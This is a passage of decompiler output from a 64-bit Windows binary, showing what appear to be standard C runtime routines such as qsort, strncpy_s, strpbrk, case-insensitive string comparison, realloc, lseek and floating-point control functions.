  return 0i64;
}
// 13F1C6400: using guessed type __int64 qword_13F1C6400[];

//----- (000000013F1765D0) ----------------------------------------------------
__int64 sub_13F1765D0()
{
  return (unsigned int)_mm_getcsr();
}

//----- (000000013F1765E0) ----------------------------------------------------
void __fastcall sub_13F1765E0(unsigned int a1)
{
  _mm_setcsr(a1);
}

//----- (000000013F1765EA) ----------------------------------------------------
void sub_13F1765EA()
{
  _mm_setcsr(_mm_getcsr() & 0xFFFFFFC0);
}

//----- (000000013F176620) ----------------------------------------------------
__int64 __fastcall sub_13F176620(_BYTE *a1, __int64 a2)
{
  __int64 result; // rax

  result = 0i64;
  if ( *a1 )
  {
    do
    {
      if ( result == a2 )
        break;
      ++result;
    }
    while ( a1[result] );
  }
  return result;
}

//----- (000000013F176640) ----------------------------------------------------
void __fastcall sub_13F176640(
        unsigned __int64 a1,
        _BYTE *a2,
        __int64 a3,
        int (__fastcall *a4)(unsigned __int64, _BYTE *))
{
  _BYTE *v6; // rdi
  unsigned __int64 v7; // r12
  _BYTE *v9; // rbx
  unsigned __int64 i; // rsi
  __int64 v11; // r8
  _BYTE *v12; // rax
  __int64 v13; // rbx
  char v14; // dl

  if ( (unsigned __int64)a2 > a1 )
  {
    v6 = a2;
    v7 = a1 + a3;
    do
    {
      v9 = (_BYTE *)a1;
      for ( i = v7; i <= (unsigned __int64)v6; i += a3 )
      {
        if ( a4(i, v9) > 0 )
          v9 = (_BYTE *)i;
      }
      v11 = a3;
      v12 = v6;
      if ( v9 != v6 && a3 )
      {
        v13 = v9 - v6;
        do
        {
          v14 = v12[v13];
          v12[v13] = *v12;
          *v12++ = v14;
          --v11;
        }
        while ( v11 );
      }
      v6 -= a3;
    }
    while ( (unsigned __int64)v6 > a1 );
  }
}
// 13F180450: using guessed type __int64 (__fastcall *_guard_check_icall_fptr)(_QWORD);

//----- (000000013F176710) ----------------------------------------------------
void __fastcall sub_13F176710(
        unsigned __int64 a1,
        unsigned __int64 a2,
        unsigned __int64 a3,
        int (__fastcall *a4)(unsigned __int64, _BYTE *))
{
  unsigned __int64 v6; // r12
  _BYTE *v7; // r15
  __int64 v8; // r13
  unsigned __int64 v9; // rsi
  _BYTE *v10; // rsi
  unsigned __int64 v11; // r8
  _BYTE *v12; // rdx
  unsigned __int64 v13; // r9
  char v14; // cl
  unsigned __int64 v15; // r8
  _BYTE *v16; // rdx
  unsigned __int64 v17; // r9
  char v18; // cl
  unsigned __int64 v19; // r8
  _BYTE *v20; // rdx
  __int64 v21; // r9
  char v22; // cl
  unsigned __int64 v23; // rbx
  unsigned __int64 v24; // rdi
  _BYTE *v25; // rdx
  unsigned __int64 v26; // r9
  char v27; // cl
  unsigned __int64 v28; // rdi
  __int64 v29[124]; // [rsp+20h] [rbp-438h]

  v6 = a1;
  if ( (a1 || !a2) && a3 && a4 )
  {
    if ( a2 >= 2 )
    {
      v7 = (_BYTE *)(a1 + a3 * (a2 - 1));
      v8 = 0i64;
      while ( 1 )
      {
        while ( 1 )
        {
          v9 = (unsigned __int64)&v7[-v6] / a3 + 1;
          if ( v9 <= 8 )
          {
            sub_13F176640(v6, v7, a3, a4);
            goto LABEL_10;
          }
          v10 = (_BYTE *)(v6 + a3 * (v9 >> 1));
          if ( a4(v6, v10) > 0 )
          {
            v11 = a3;
            v12 = v10;
            if ( (_BYTE *)v6 != v10 )
            {
              v13 = v6 - (_QWORD)v10;
              do
              {
                v14 = v12[v13];
                v12[v13] = *v12;
                *v12++ = v14;
                --v11;
              }
              while ( v11 );
            }
          }
          if ( ((int (__fastcall *)(unsigned __int64, _BYTE *, unsigned __int64))a4)(v6, v7, v11) > 0 )
          {
            v15 = a3;
            v16 = v7;
            if ( (_BYTE *)v6 != v7 )
            {
              v17 = v6 - (_QWORD)v7;
              do
              {
                v18 = v16[v17];
                v16[v17] = *v16;
                *v16++ = v18;
                --v15;
              }
              while ( v15 );
            }
          }
          if ( ((int (__fastcall *)(_BYTE *, _BYTE *, unsigned __int64))a4)(v10, v7, v15) > 0 )
          {
            v19 = a3;
            v20 = v7;
            if ( v10 != v7 )
            {
              v21 = v10 - v7;
              do
              {
                v22 = v20[v21];
                v20[v21] = *v20;
                *v20++ = v22;
                --v19;
              }
              while ( v19 );
            }
          }
          v23 = v6;
          v24 = (unsigned __int64)v7;
          while ( 1 )
          {
            if ( (unsigned __int64)v10 > v23 )
            {
              while ( 1 )
              {
                v23 += a3;
                if ( v23 >= (unsigned __int64)v10 )
                  break;
                if ( ((int (__fastcall *)(unsigned __int64, _BYTE *, unsigned __int64))a4)(v23, v10, v19) > 0 )
                {
                  if ( (unsigned __int64)v10 > v23 )
                    goto LABEL_31;
                  goto LABEL_29;
                }
              }
            }
            do
LABEL_29:
              v23 += a3;
            while ( v23 <= (unsigned __int64)v7
                 && ((int (__fastcall *)(unsigned __int64, _BYTE *, unsigned __int64))a4)(v23, v10, v19) <= 0 );
            do
LABEL_31:
              v24 -= a3;
            while ( v24 > (unsigned __int64)v10 && a4(v24, v10) > 0 );
            if ( v24 < v23 )
              break;
            v19 = a3;
            v25 = (_BYTE *)v24;
            if ( v23 != v24 )
            {
              v26 = v23 - v24;
              do
              {
                v27 = v25[v26];
                v25[v26] = *v25;
                *v25++ = v27;
                --v19;
              }
              while ( v19 );
            }
            if ( v10 == (_BYTE *)v24 )
              v10 = (_BYTE *)v23;
          }
          v28 = a3 + v24;
          if ( (unsigned __int64)v10 < v28 )
          {
            while ( 1 )
            {
              v28 -= a3;
              if ( v28 <= (unsigned __int64)v10 )
                break;
              if ( a4(v28, v10) )
              {
                if ( (unsigned __int64)v10 < v28 )
                  goto LABEL_45;
                goto LABEL_43;
              }
            }
          }
          do
LABEL_43:
            v28 -= a3;
          while ( v28 > v6 && !a4(v28, v10) );
LABEL_45:
          if ( (__int64)(v28 - v6) >= (__int64)&v7[-v23] )
            break;
          if ( v23 < (unsigned __int64)v7 )
          {
            v29[v8] = v23;
            v29[v8++ + 62] = (__int64)v7;
          }
          if ( v6 >= v28 )
          {
LABEL_10:
            if ( --v8 < 0 )
              return;
            v6 = v29[v8];
            v7 = (_BYTE *)v29[v8 + 62];
          }
          else
          {
            v7 = (_BYTE *)v28;
          }
        }
        if ( v6 < v28 )
        {
          v29[v8] = v6;
          v29[v8++ + 62] = v28;
        }
        if ( v23 >= (unsigned __int64)v7 )
          goto LABEL_10;
        v6 = v23;
      }
    }
  }
  else
  {
    *(_DWORD *)sub_13F169DAC() = 22;
    sub_13F1682A0();
  }
}
// 13F176838: variable 'v11' is possibly undefined
// 13F176877: variable 'v15' is possibly undefined
// 13F1768CC: variable 'v19' is possibly undefined
// 13F180450: using guessed type __int64 (__fastcall *_guard_check_icall_fptr)(_QWORD);

//----- (000000013F176A44) ----------------------------------------------------
__int64 __fastcall sub_13F176A44(_BYTE *a1, __int64 a2, __int64 a3, __int64 a4)
{
  unsigned int v4; // er10
  char *v6; // rax
  unsigned int v7; // ebx
  __int64 v9; // r8
  _BYTE *v10; // rdx
  __int64 v11; // rbx
  __int64 v12; // rdi
  char v13; // al
  char v14; // al

  v4 = 0;
  if ( a4 )
  {
    if ( !a1 )
      goto LABEL_4;
    goto LABEL_8;
  }
  if ( a1 )
  {
LABEL_8:
    if ( !a2 )
      goto LABEL_4;
    if ( !a4 )
    {
      *a1 = 0;
      return v4;
    }
    if ( !a3 )
    {
      *a1 = 0;
      goto LABEL_4;
    }
    v9 = a3 - (_QWORD)a1;
    v10 = a1;
    v11 = a2;
    v12 = a4;
    if ( a4 == -1 )
    {
      do
      {
        v13 = v10[v9];
        *v10++ = v13;
        if ( !v13 )
          break;
        --v11;
      }
      while ( v11 );
    }
    else
    {
      do
      {
        v14 = v10[v9];
        *v10++ = v14;
        if ( !v14 )
          break;
        if ( !--v11 )
          break;
        --v12;
      }
      while ( v12 );
      if ( !v12 )
        *v10 = 0;
    }
    if ( !v11 )
    {
      if ( a4 == -1 )
      {
        a1[a2 - 1] = 0;
        return 80;
      }
      *a1 = 0;
      v6 = sub_13F169DAC();
      v7 = 34;
      goto LABEL_5;
    }
    return v4;
  }
  if ( a2 )
  {
LABEL_4:
    v6 = sub_13F169DAC();
    v7 = 22;
LABEL_5:
    *(_DWORD *)v6 = v7;
    sub_13F1682A0();
    return v7;
  }
  return v4;
}

//----- (000000013F176B18) ----------------------------------------------------
_BYTE *__fastcall sub_13F176B18(_BYTE *a1, unsigned __int8 *a2)
{
  __int64 v2; // rax
  unsigned __int8 *v3; // r9
  bool v4; // cf
  _BYTE *v5; // r8
  unsigned __int8 i; // al
  char v8[32]; // [rsp+20h] [rbp-38h]

  v2 = 0i64;
  v3 = a2;
  v4 = 1;
  v5 = a1;
  do
  {
    if ( !v4 )
    {
      _report_rangecheckfailure(a1, a2, a1, a2);
      JUMPOUT(0x13F176BB5i64);
    }
    v8[v2++] = 0;
    v4 = (unsigned __int64)v2 < 0x20;
  }
  while ( v2 < 32 );
  for ( i = *a2; i; i = *v3 )
  {
    ++v3;
    v8[(unsigned __int64)i >> 3] |= 1 << (i & 7);
  }
  while ( 1 )
  {
    if ( !*v5 )
      return 0i64;
    if ( ((unsigned __int8)(1 << (*v5 & 7)) & (unsigned __int8)v8[(unsigned __int64)(unsigned __int8)*v5 >> 3]) != 0 )
      break;
    ++v5;
  }
  return v5;
}
// 13F176BB0: control flows out of bounds to 13F176BB5
// 13F1409C8: using guessed type __int64 __fastcall _report_rangecheckfailure(_QWORD, _QWORD, _QWORD, _QWORD);
// 13F176B18: using guessed type char var_38[32];

//----- (000000013F176BB8) ----------------------------------------------------
__int64 __fastcall sub_13F176BB8(unsigned __int64 a1, unsigned __int64 a2)
{
  return sub_13F176BC0(a1, a2, 0i64);
}

//----- (000000013F176BC0) ----------------------------------------------------
__int64 __fastcall sub_13F176BC0(unsigned __int64 a1, unsigned __int64 a2, __int128 *a3)
{
  __int64 v6; // rbx
  unsigned __int8 *v7; // rdx
  __int64 v8; // [rsp+20h] [rbp-28h] BYREF
  __int64 v9; // [rsp+30h] [rbp-18h]
  char v10; // [rsp+38h] [rbp-10h]

  if ( !a1 || !a2 )
  {
    *(_DWORD *)sub_13F169DAC() = 22;
    sub_13F1682A0();
    return 0i64;
  }
  if ( a1 >= a2 )
    return 0i64;
  sub_13F1687CC((__int64)&v8, a3);
  if ( *(_DWORD *)(v9 + 8) )
  {
    v7 = (unsigned __int8 *)(a2 - 1);
    do
      --v7;
    while ( a1 <= (unsigned __int64)v7 && (*(_BYTE *)(*v7 + v9 + 25) & 4) != 0 );
    v6 = a2 - (((_BYTE)a2 - (_BYTE)v7) & 1) - 1;
  }
  else
  {
    v6 = a2 - 1;
  }
  if ( v10 )
    *(_DWORD *)(v8 + 936) &= ~2u;
  return v6;
}

//----- (000000013F176C58) ----------------------------------------------------
_BOOL8 sub_13F176C58()
{
  return sub_13F172178() == 0;
}

//----- (000000013F176C70) ----------------------------------------------------
__int64 __fastcall sub_13F176C70(unsigned __int8 *a1, unsigned __int8 *a2, unsigned __int64 a3)
{
  return sub_13F17792C(a1, a2, a3);
}
// 13F1C6238: using guessed type int dword_13F1C6238;

//----- (000000013F176C88) ----------------------------------------------------
__int64 __fastcall sub_13F176C88(unsigned __int8 *a1, unsigned __int8 *a2, unsigned __int64 a3, __int128 *a4)
{
  unsigned int v7; // ebx
  __int64 v8; // rdx
  int v9; // eax
  __int64 v11; // [rsp+40h] [rbp-28h] BYREF
  __int128 v12; // [rsp+48h] [rbp-20h] BYREF
  char v13; // [rsp+58h] [rbp-10h]

  sub_13F1687CC((__int64)&v11, a4);
  if ( a3 )
  {
    if ( a1 && a2 )
    {
      v7 = 0x7FFFFFFF;
      if ( a3 <= 0x7FFFFFFF )
      {
        v8 = *(_QWORD *)(v12 + 304);
        if ( v8 )
        {
          v9 = sub_13F177DEC(&v12, v8, 0x1001u, a1, a3, a2, a3, *(_DWORD *)(v12 + 20));
          if ( v9 )
            v7 = v9 - 2;
          else
            *(_DWORD *)sub_13F169DAC() = 22;
        }
        else
        {
          v7 = sub_13F17797C(a1, a2, a3, &v12);
        }
      }
      else
      {
        *(_DWORD *)sub_13F169DAC() = 22;
        sub_13F1682A0();
      }
    }
    else
    {
      *(_DWORD *)sub_13F169DAC() = 22;
      sub_13F1682A0();
      v7 = 0x7FFFFFFF;
    }
  }
  else
  {
    v7 = 0;
  }
  if ( v13 )
    *(_DWORD *)(v11 + 936) &= ~2u;
  return v7;
}

//----- (000000013F176D88) ----------------------------------------------------
__int64 __fastcall sub_13F176D88(__int64 a1, unsigned __int64 a2)
{
  __int64 result; // rax
  unsigned __int64 v5; // r9
  __int64 i; // r8

  if ( !a1 )
    return sub_13F16F1F8(a2);
  if ( !a2 )
  {
    sub_13F16E734(a1);
    return 0i64;
  }
  if ( a2 > 0xFFFFFFFFFFFFFFE0ui64 )
  {
LABEL_12:
    *(_DWORD *)sub_13F169DAC() = 12;
    return 0i64;
  }
  v5 = a2;
  for ( i = a1; ; i = a1 )
  {
    result = MEMORY[0x771C0BA0](3735552i64, 0i64, i, v5);
    if ( result )
      break;
    if ( !(unsigned int)sub_13F16D3C0() || !sub_13F16C1D0(a2) )
      goto LABEL_12;
    v5 = a2;
  }
  return result;
}
// 13F1C6A70: using guessed type __int64 qword_13F1C6A70;

//----- (000000013F176E0C) ----------------------------------------------------
__int64 __fastcall sub_13F176E0C(int a1, __int64 a2, unsigned int a3)
{
  __int64 v3; // rbx
  __int64 v6; // rax
  __int64 result; // rax
  int v8; // eax
  __int64 v9; // [rsp+48h] [rbp+20h] BYREF

  v3 = a1;
  v6 = sub_13F173200(a1);
  if ( v6 == -1 )
  {
    *(_DWORD *)sub_13F169DAC() = 9;
    return -1i64;
  }
  if ( !(unsigned int)MEMORY[0x76F7A3B0](v6, a2, &v9, a3) )
  {
    v8 = MEMORY[0x76F91760]();
    sub_13F169D3C(v8);
    return -1i64;
  }
  result = v9;
  if ( v9 == -1 )
    return -1i64;
  *(_BYTE *)(qword_13F1C6400[v3 >> 6] + ((unsigned __int64)(v3 & 0x3F) << 6) + 56) &= ~2u;
  return result;
}
// 13F1C6400: using guessed type __int64 qword_13F1C6400[];

//----- (000000013F176EB0) ----------------------------------------------------
__int64 __fastcall sub_13F176EB0(unsigned __int16 a1)
{
  unsigned __int16 v2; // [rsp+40h] [rbp+8h] BYREF
  char v3; // [rsp+48h] [rbp+10h] BYREF

  v2 = a1;
  sub_13F177E78();
  if ( (unsigned int)MEMORY[0x76F831E0](-2i64, &v2, 1i64, &v3, 0i64) )
    return v2;
  else
    return 0xFFFFi64;
}
// 13F1B7B70: using guessed type __int64 qword_13F1B7B70;

//----- (000000013F176F0C) ----------------------------------------------------
__int64 __fastcall sub_13F176F0C(__int64 a1, __int64 a2, int **a3)
{
  unsigned int v4; // ebx

  sub_13F1730FC();
  if ( (*(_BYTE *)(qword_13F1C6400[(__int64)**a3 >> 6] + ((unsigned __int64)(**a3 & 0x3F) << 6) + 56) & 1) != 0 )
  {
    v4 = sub_13F177024(**a3);
  }
  else
  {
    *(_DWORD *)sub_13F169DAC() = 9;
    v4 = -1;
  }
  sub_13F173120();
  return v4;
}
// 13F1C6400: using guessed type __int64 qword_13F1C6400[];

//----- (000000013F176F80) ----------------------------------------------------
__int64 __fastcall sub_13F176F80(int a1)
{
  int *v2; // [rsp+20h] [rbp-18h] BYREF
  int v3; // [rsp+40h] [rbp+8h] BYREF
  char v4; // [rsp+48h] [rbp+10h] BYREF
  int v5; // [rsp+50h] [rbp+18h]
  int v6; // [rsp+58h] [rbp+20h] BYREF

  v3 = a1;
  if ( a1 == -2 )
  {
    *sub_13F169D8C() = 0;
    *(_DWORD *)sub_13F169DAC() = 9;
  }
  else
  {
    if ( a1 >= 0
      && (unsigned int)a1 < 0x40
      && (*(_BYTE *)(qword_13F1C6400[(__int64)a1 >> 6] + ((unsigned __int64)(a1 & 0x3F) << 6) + 56) & 1) != 0 )
    {
      v5 = a1;
      v6 = a1;
      v2 = &v3;
      return sub_13F176F0C((__int64)&v4, (__int64)&v6, &v2);
    }
    *sub_13F169D8C() = 0;
    *(_DWORD *)sub_13F169DAC() = 9;
    sub_13F1682A0();
  }
  return 0xFFFFFFFFi64;
}
// 13F1C6400: using guessed type __int64 qword_13F1C6400[];

//----- (000000013F177024) ----------------------------------------------------
__int64 __fastcall sub_13F177024(int a1)
{
  __int64 v1; // rdi
  int v2; // ebx
  __int64 v3; // rbx
  __int64 v4; // rax

  v1 = a1;
  if ( sub_13F173200(a1) == -1
    || ((_DWORD)v1 == 1 && (MEMORY[0x3C4098] & 1) != 0 || (_DWORD)v1 == 2 && (MEMORY[0x3C4058] & 1) != 0)
    && (v3 = sub_13F173200(2), sub_13F173200(1) == v3)
    || (v4 = sub_13F173200(v1), (unsigned int)MEMORY[0x76F91910](v4)) )
  {
    v2 = 0;
  }
  else
  {
    v2 = MEMORY[0x76F91760]();
  }
  sub_13F173144(v1);
  *(_BYTE *)(qword_13F1C6400[v1 >> 6] + ((unsigned __int64)(v1 & 0x3F) << 6) + 56) = 0;
  if ( !v2 )
    return 0i64;
  sub_13F169D3C(v2);
  return 0xFFFFFFFFi64;
}
// 13F1C6400: using guessed type __int64 qword_13F1C6400[];

//----- (000000013F1770E0) ----------------------------------------------------
__int64 __fastcall sub_13F1770E0(__int64 a1)
{
  __int64 result; // rax

  *(_QWORD *)a1 = 0i64;
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_DWORD *)(a1 + 16) = 0;
  *(_DWORD *)(a1 + 24) = -1;
  *(_DWORD *)(a1 + 28) = 0;
  *(_DWORD *)(a1 + 32) = 0;
  *(_QWORD *)(a1 + 40) = 0i64;
  result = a1;
  _InterlockedExchange((volatile __int32 *)(a1 + 20), 0);
  return result;
}

//----- (000000013F177124) ----------------------------------------------------
__int64 __fastcall sub_13F177124(_DWORD *a1)
{
  *a1 = sub_13F17785C();
  a1[1] = sub_13F177874();
  return 0i64;
}

//----- (000000013F177144) ----------------------------------------------------
_BOOL8 __fastcall sub_13F177144(int *a1)
{
  int v2; // ecx
  int v4; // [rsp+30h] [rbp+8h] BYREF
  int v5; // [rsp+34h] [rbp+Ch]

  v4 = 0;
  v2 = *a1;
  v5 = 0;
  sub_13F177888(v2);
  sub_13F177894(a1[1]);
  sub_13F177124(&v4);
  return *a1 != v4 || a1[1] != v5;
}

//----- (000000013F177190) ----------------------------------------------------
__int64 __fastcall sub_13F177190(__int64 *a1)
{
  __int64 v3; // rax
  __int64 v4; // [rsp+38h] [rbp+10h] BYREF

  v4 = 0i64;
  if ( (unsigned int)sub_13F177124(&v4) )
    return 1i64;
  v3 = v4;
  LODWORD(v4) = v4 | 0x1F;
  *a1 = v3;
  if ( sub_13F177144((int *)&v4) )
    return 1i64;
  sub_13F177ED4();
  return 0i64;
}

//----- (000000013F1771E0) ----------------------------------------------------
double __fastcall sub_13F1771E0(double result)
{
  double v1; // rdx
  unsigned __int64 v2; // rax
  _BOOL8 v3; // r8
  double v4; // rax

  v1 = result;
  v2 = *(_QWORD *)&result & 0x7FFFFFFFFFFFFFFFi64;
  v3 = *(_QWORD *)&result != (*(_QWORD *)&result & 0x7FFFFFFFFFFFFFFFi64);
  if ( (*(_QWORD *)&result & 0x7FFFFFFFFFFFFFFFui64) < 0x4340000000000000i64 )
  {
    if ( v2 >= 0x3FF0000000000000i64 )
    {
      *(_QWORD *)&v4 = *(_QWORD *)&result & ~((1i64 << (51 - (unsigned __int8)(*(_QWORD *)&result >> 52))) - 1);
      result = v4;
      if ( !v3 && *(_QWORD *)&v4 != *(_QWORD *)&v1 )
        return v4 + 1.0;
    }
    else if ( v2 )
    {
      if ( *(_QWORD *)&result == (*(_QWORD *)&result & 0x7FFFFFFFFFFFFFFFi64) )
        return 1.0;
      else
        return -0.0;
    }
  }
  else if ( v2 > 0x7FF0000000000000i64 )
  {
    return sub_13F1749B8(*(__int64 *)&result);
  }
  return result;
}

//----- (000000013F1772B0) ----------------------------------------------------
// local variable allocation has failed, the output may be wrong!
void __fastcall sub_13F1772B0(double _XMM0_8)
{
  __asm
  {
    vpsrlq  xmm3, xmm0, 34h ; '4'
    vmovq   rax, xmm0
    vpsubq  xmm3, xmm3, cs:xmmword_13F196220
    vcvtdq2pd xmm6, xmm3
    vpand   xmm5, xmm0, cs:xmmword_13F1961F0
    vcomisd xmm5, qword ptr cs:xmmword_13F1961F0
  }
  if ( _RAX != 0x7FF0000000000000i64 )
  {
    if ( _RAX == 0xFFF0000000000000ui64 )
    {
      __asm { vmovsd  xmm1, cs:qword_13F196200 }
      sub_13F171140(_XMM0_8, *(double *)&_XMM1, 2);
      __asm { vmovdqa xmm6, [rsp+58h+var_38] }
      return;
    }
    sub_13F171140(_XMM0_8, COERCE_DOUBLE(_RAX | 0x8000000000000i64), 3);
  }
  __asm { vmovdqa xmm6, [rsp+58h+var_38] }
}
// 13F1772B0: inconsistent variable size for 'xmm0_8.8(_XMM0_8)'
// 13F1C6A40: using guessed type int dword_13F1C6A40;

//----- (000000013F17785C) ----------------------------------------------------
__int64 sub_13F17785C()
{
  return sub_13F177F28(0, 0) & 0x31F;
}

//----- (000000013F177874) ----------------------------------------------------
__int64 sub_13F177874()
{
  return sub_13F177F34() & 0x1F;
}

//----- (000000013F177888) ----------------------------------------------------
int __fastcall sub_13F177888(int a1)
{
  return sub_13F177F28(a1, 525087);
}

//----- (000000013F177894) ----------------------------------------------------
void __fastcall sub_13F177894(char a1)
{
  int v2; // eax
  int v3; // ecx

  v2 = sub_13F1765D0() & 0xFFFFFFC2;
  v3 = 0;
  if ( (a1 & 0x1F) != 0 )
  {
    if ( (a1 & 0x10) != 0 )
      v3 = 1;
    if ( (a1 & 8) != 0 )
      v3 |= 4u;
    if ( (a1 & 4) != 0 )
      v3 |= 8u;
    if ( (a1 & 2) != 0 )
      v3 |= 0x10u;
    if ( (a1 & 1) != 0 )
      v3 |= 0x20u;
  }
  sub_13F1765E0(v2 | v3);
}

//----- (000000013F1778E4) ----------------------------------------------------
__int64 __fastcall sub_13F1778E4(unsigned __int8 *a1, unsigned __int8 *a2, __int64 a3)
{
  int v4; // er9
  int v5; // ecx

  if ( !a3 )
    return 0i64;
  do
  {
    v4 = *a1++;
    if ( (unsigned int)(v4 - 65) <= 0x19 )
      v4 += 32;
    v5 = *a2++;
    if ( (unsigned int)(v5 - 65) <= 0x19 )
      v5 += 32;
    --a3;
  }
  while ( a3 && v4 && v4 == v5 );
  return (unsigned int)(v4 - v5);
}

//----- (000000013F17792C) ----------------------------------------------------
__int64 __fastcall sub_13F17792C(unsigned __int8 *a1, unsigned __int8 *a2, unsigned __int64 a3)
{
  if ( a1 && a2 && a3 <= 0x7FFFFFFF )
    return sub_13F1778E4(a1, a2, a3);
  *(_DWORD *)sub_13F169DAC() = 22;
  sub_13F1682A0();
  return 0x7FFFFFFFi64;
}
// 13F1C6238: using guessed type int dword_13F1C6238;

//----- (000000013F17797C) ----------------------------------------------------
__int64 __fastcall sub_13F17797C(unsigned __int8 *a1, unsigned __int8 *a2, unsigned __int64 a3, __int128 *a4)
{
  unsigned __int64 v4; // rbp
  unsigned int v7; // ebx
  signed __int64 v8; // rsi
  int v9; // ebx
  int v10; // eax
  __int64 v12; // [rsp+20h] [rbp-28h] BYREF
  __int128 v13; // [rsp+28h] [rbp-20h] BYREF
  char v14; // [rsp+38h] [rbp-10h]

  v4 = a3;
  if ( !a3 )
    return 0i64;
  sub_13F1687CC((__int64)&v12, a4);
  v7 = 0x7FFFFFFF;
  if ( a1 && a2 && v4 <= 0x7FFFFFFF )
  {
    if ( *(_QWORD *)(v13 + 312) )
    {
      v8 = a1 - a2;
      do
      {
        v9 = sub_13F16A440(a2[v8], &v13);
        v10 = sub_13F16A440(*a2++, &v13);
        --v4;
      }
      while ( v4 && v9 && v9 == v10 );
      v7 = v9 - v10;
    }
    else
    {
      v7 = sub_13F1778E4(a1, a2, v4);
    }
  }
  else
  {
    *(_DWORD *)sub_13F169DAC() = 22;
    sub_13F1682A0();
  }
  if ( v14 )
    *(_DWORD *)(v12 + 936) &= ~2u;
  return v7;
}

//----- (000000013F177A58) ----------------------------------------------------
__int64 __fastcall sub_13F177A58(
        __int64 a1,
        __int64 a2,
        unsigned int a3,
        _BYTE *a4,
        int a5,
        _BYTE *a6,
        int a7,
        unsigned int a8)
{
  int v8; // ebx
  int v11; // esi
  unsigned int v13; // er14
  bool v14; // zf
  char *i; // rax
  bool v16; // zf
  char *j; // rax
  signed int v18; // eax
  unsigned int v19; // er12
  unsigned __int64 v20; // rdx
  unsigned __int64 v21; // rax
  unsigned __int64 v22; // rcx
  __int64 v23; // rax
  void *v24; // rsp
  unsigned int *v25; // rdi
  unsigned int *v26; // rax
  int v27; // eax
  int v28; // er15
  unsigned __int64 v29; // r8
  unsigned __int64 v30; // rax
  unsigned __int64 v31; // rcx
  __int64 v32; // rax
  void *v33; // rsp
  unsigned int *v34; // rbx
  unsigned int *v35; // rax
  unsigned int v36; // esi
  _BYTE v37[32]; // [rsp+0h] [rbp-50h] BYREF
  unsigned int v38; // [rsp+50h] [rbp+0h] BYREF
  __int64 v39; // [rsp+58h] [rbp+8h]
  int v40; // [rsp+60h] [rbp+10h] BYREF
  char v41[18]; // [rsp+66h] [rbp+16h] BYREF

  v8 = a5;
  v38 = a3;
  v39 = a2;
  if ( a5 <= 0 )
  {
    if ( a5 < -1 )
      return 0i64;
  }
  else
  {
    v8 = sub_13F176620(a4, a5);
  }
  v11 = a7;
  if ( a7 <= 0 )
  {
    if ( a7 < -1 )
      return 0i64;
  }
  else
  {
    v11 = sub_13F176620(a6, a7);
  }
  v13 = a8;
  if ( !a8 )
    v13 = *(_DWORD *)(*(_QWORD *)a1 + 12i64);
  if ( v8 && v11 )
    goto LABEL_35;
  if ( v8 == v11 )
    return 2i64;
  if ( v11 > 1 )
    return 1i64;
  if ( v8 > 1 )
    return 3i64;
  if ( !(unsigned int)MEMORY[0x76F86180](v13, &v40) )
    return 0i64;
  if ( v8 > 0 )
  {
    if ( (unsigned int)v40 >= 2 )
    {
      v14 = v41[0] == 0;
      for ( i = v41; !v14 && i[1]; v14 = *i == 0 )
      {
        if ( *a4 >= (unsigned __int8)*i && *a4 <= (unsigned __int8)i[1] )
          return 2i64;
        i += 2;
      }
    }
    return 3i64;
  }
  if ( v11 > 0 )
  {
    if ( (unsigned int)v40 >= 2 )
    {
      v16 = v41[0] == 0;
      for ( j = v41; !v16 && j[1]; v16 = *j == 0 )
      {
        if ( *a6 >= (unsigned __int8)*j && *a6 <= (unsigned __int8)j[1] )
          return 2i64;
        j += 2;
      }
    }
    return 1i64;
  }
LABEL_35:
  v18 = MEMORY[0x76F84FF0](v13, 9i64, a4, (unsigned int)v8, 0i64, 0);
  v19 = v18;
  if ( !v18 )
    return 0i64;
  v20 = 2i64 * v18;
  if ( (-(__int64)(v20 < v20 + 16) & (v20 + 16)) == 0 )
  {
    v25 = 0i64;
    goto LABEL_46;
  }
  v21 = v20 + 16;
  if ( ((v20 + 16) & -(__int64)(v20 < v20 + 16)) <= 0x400 )
  {
    v22 = v21 & -(__int64)(v20 < v21);
    v23 = v22 + 15;
    if ( v22 + 15 <= v22 )
      v23 = 0xFFFFFFFFFFFFFF0i64;
    v24 = alloca(v23 & 0xFFFFFFFFFFFFFFF0ui64);
    v25 = &v38;
    if ( v37 == (_BYTE *)-80i64 )
      goto LABEL_66;
    v38 = 52428;
    goto LABEL_44;
  }
  v26 = (unsigned int *)sub_13F16F1F8(v21 & -(__int64)(v20 < v21));
  v25 = v26;
  if ( v26 )
  {
    *v26 = 56797;
LABEL_44:
    v25 += 4;
  }
LABEL_46:
  if ( v25 )
  {
    if ( (unsigned int)MEMORY[0x76F84FF0](v13, 1i64, a4, (unsigned int)v8, v25, v19) )
    {
      v27 = MEMORY[0x76F84FF0](v13, 9i64, a6, (unsigned int)v11, 0i64, 0);
      v28 = v27;
      if ( v27 )
      {
        v29 = 2i64 * v27;
        if ( (-(__int64)(v29 < v29 + 16) & (v29 + 16)) == 0 )
        {
          v34 = 0i64;
          goto LABEL_59;
        }
        v30 = v29 + 16;
        if ( ((v29 + 16) & -(__int64)(v29 < v29 + 16)) > 0x400 )
        {
          v35 = (unsigned int *)sub_13F16F1F8(v30 & -(__int64)(v29 < v30));
          v34 = v35;
          if ( !v35 )
          {
LABEL_59:
            if ( v34 && (unsigned int)MEMORY[0x76F84FF0](v13, 1i64, a6, (unsigned int)v11, v34, v28) )
            {
              v36 = sub_13F16E914(v39, v38, (__int64)v25, v19, (__int64)v34, v28, 0i64, 0i64, 0i64);
LABEL_63:
              if ( v34 && *(v34 - 4) == 56797 )
                sub_13F16E734((__int64)(v34 - 4));
              goto LABEL_67;
            }
LABEL_62:
            v36 = 0;
            goto LABEL_63;
          }
          *v35 = 56797;
        }
        else
        {
          v31 = v30 & -(__int64)(v29 < v30);
          v32 = v31 + 15;
          if ( v31 + 15 <= v31 )
            v32 = 0xFFFFFFFFFFFFFF0i64;
          v33 = alloca(v32 & 0xFFFFFFFFFFFFFFF0ui64);
          v34 = &v38;
          if ( v37 == (_BYTE *)-80i64 )
            goto LABEL_62;
          v38 = 52428;
        }
        v34 += 4;
        goto LABEL_59;
      }
    }
  }
LABEL_66:
  v36 = 0;
LABEL_67:
  if ( v25 && *(v25 - 4) == 56797 )
    sub_13F16E734((__int64)(v25 - 4));
  return v36;
}
// 13F177A58: using guessed type unsigned int var_60;

//----- (000000013F177DEC) ----------------------------------------------------
__int64 __fastcall sub_13F177DEC(
        __int128 *a1,
        __int64 a2,
        unsigned int a3,
        _BYTE *a4,
        int a5,
        _BYTE *a6,
        int a7,
        unsigned int a8)
{
  __int64 result; // rax
  __int64 v12; // [rsp+40h] [rbp-28h] BYREF
